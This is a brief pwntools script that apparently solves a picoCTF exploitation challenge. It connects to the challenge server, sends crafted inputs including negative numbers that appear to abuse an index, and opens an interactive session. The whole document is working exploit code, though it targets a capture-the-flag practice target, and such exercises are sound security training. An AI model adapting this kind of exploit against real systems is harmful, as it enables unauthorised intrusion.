from pwn import *

# r = process('./vuln')
r = remote('saturn.picoctf.net', 58094)
easy_checker_addr = 0x080492fc
r.recvuntil(b'>> ')
r.sendline(b'z' * 10 + b'u')
r.recvline()
r.sendline(b'-16')
r.sendline(b'-314')

r.interactive()